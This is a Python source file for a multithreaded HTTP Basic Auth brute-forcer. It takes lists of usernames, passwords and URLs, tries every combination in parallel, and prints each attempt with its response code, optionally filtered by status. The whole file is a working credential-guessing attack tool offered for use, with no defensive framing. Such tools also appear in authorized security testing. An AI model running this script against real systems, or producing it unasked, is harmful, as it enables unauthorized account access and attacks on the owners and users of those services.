import argparse
import requests
from requests.auth import HTTPBasicAuth
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
import time

def make_http_request(username, password, url, pbar):
    try:
        response = requests.request(http_method, url, auth=HTTPBasicAuth(username, password))
        response_code = response.status_code

        pbar.update(1)  # Update the progress bar for all requests

        if exclude_status and str(response_code) in exclude_status:
            return  
        if show_status and str(response_code) in show_status:
            print(f"URL: {url} - Username: {username} - Password: {password} - HTTP Method: {http_method} - Response Code: {response_code}")
        elif not show_status:
            print(f"URL: {url} - Username: {username} - Password: {password} - HTTP Method: {http_method} - Response Code: {response_code}")
    except requests.exceptions.RequestException as e:
        print(f"URL: {url} - Username: {username} - Password: {password} - HTTP Method: {http_method} - Error: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple HTTP Multi Threaded Bruteforcer")
    parser.add_argument("-u", "--username", help="Specify a single username")
    parser.add_argument("-U", "--usernames_file", help="Specify a file containing a list of usernames (one per line)")
    parser.add_argument("-p", "--password", help="Specify a single password")
    parser.add_argument("-P", "--passwords_file", help="Specify a file containing a list of passwords (one per line)")
    parser.add_argument("-url", "--url", help="Specify a single URL")
    parser.add_argument("-urls", "--urls_file", help="Specify a file containing a list of URLs (one per line)")
    parser.add_argument("-m", "--http_method", default="GET", help="Specify the HTTP method (GET by default)")
    parser.add_argument("-e", "--exclude_status", help="Specify status codes to exclude (comma-separated)")
    parser.add_argument("-s", "--show_status", help="Specify status codes to show only (comma-separated)")
    parser.add_argument("-t", "--threads", type=int, default=4, help="Specify the number of threads (default is 4)")
    args = parser.parse_args()

    if not (args.username or args.usernames_file or args.password or args.passwords_file or args.url or args.urls_file):
        parser.print_help()
        exit()


    # Read usernames and passwords from files if provided
    usernames = [args.username] if args.username else []
    passwords = [args.password] if args.password else []

    if args.usernames_file:
        with open(args.usernames_file, "r") as f:
            usernames += [line.strip() for line in f]

    if args.passwords_file:
        with open(args.passwords_file, "r") as f:
            passwords += [line.strip() for line in f]

    # Read URLs from file if provided
    urls = [args.url] if args.url else []

    if args.urls_file:
        with open(args.urls_file, "r") as f:
            urls += [line.strip() for line in f]

    http_method = args.http_method
    exclude_status = args.exclude_status.split(",") if args.exclude_status else []
    show_status = args.show_status.split(",") if args.show_status else []

    # Calculate the total number of iterations
    total_iterations = len(usernames) * len(passwords) * len(urls)

  # Initialize the progress bar
    with tqdm(total=total_iterations, unit="req") as pbar:
        # Parallel processing
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            for username in usernames:
                for password in passwords:
                    for url in urls:
                        executor.submit(make_http_request, username, password, url, pbar)
                        

    # Calculate and display the elapsed time
    elapsed_time = time.time() - pbar.start_t
    print(f"Elapsed Time: {elapsed_time:.2f} seconds")

    # Calculate and display the estimated time to finish if pbar.n is not zero
    if pbar.n > 0:
        estimated_time_to_finish = elapsed_time * (total_iterations - pbar.n) / pbar.n
        print(f"Estimated Time to Finish: {estimated_time_to_finish:.2f} seconds")
    else:
        print("Estimated Time to Finish: N/A (No iterations completed)")    
